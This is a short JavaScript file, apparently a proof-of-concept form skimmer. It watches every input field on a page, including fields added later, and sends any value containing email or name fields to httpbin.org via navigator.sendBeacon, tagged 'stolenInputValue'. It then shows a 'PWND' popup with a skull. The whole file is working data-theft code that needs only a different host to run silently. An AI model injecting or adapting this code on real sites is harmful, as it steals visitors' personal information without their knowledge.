const pwned = (data, type) => {
    if (data.includes("email") || data.includes("firstName") || data.includes("lastName")) {
        navigator.sendBeacon(`https://httpbin.org/post?${type}`, JSON.stringify(data));

        //show a popper on the document's bottom right corner stating 'PWND: values' with a skull in front of it
        const popper = document.createElement("div");
        popper.style.position = "fixed";
        popper.style.bottom = "10px";
        popper.style.right = "10px";
        popper.style.backgroundColor = "black";
        popper.style.padding = "10px";
        popper.style.border = "1px solid white";
        popper.style.borderRadius = "5px";
        popper.style.zIndex = "1000";
        popper.style.color = "white";
        popper.textContent = `💀 PWND: ${data} ${type}`;
        document.body.appendChild(popper);
        setTimeout(() => {
            document.body.removeChild(popper);
        }, 3000);
    } else {
        console.log("not pwned", data); 
    }
}

/**
 * Looking for inputs in the dom and sending them to httpbin if they change
 */

const handleChange = (e) => {
    console.log("change", e.target.name, e.target.value);
    const data = JSON.stringify({
        name: e.target.name,
        value: e.target.value,
    }, null, 2);
    pwned(data, "stolenInputValue");
}

const resetListeners = () => {
    const inputFields = document.querySelectorAll("input");
    inputFields.forEach((input) => {
        input.removeEventListener("change", handleChange);
        input.addEventListener("change", handleChange);
    });
}

const observer = new MutationObserver((mutations) => {
    mutations.forEach((mutation) => {
        if (mutation.addedNodes.length > 0) {
            resetListeners();
        }
    });
});

observer.observe(document.body, { childList: true, subtree: true });

resetListeners();
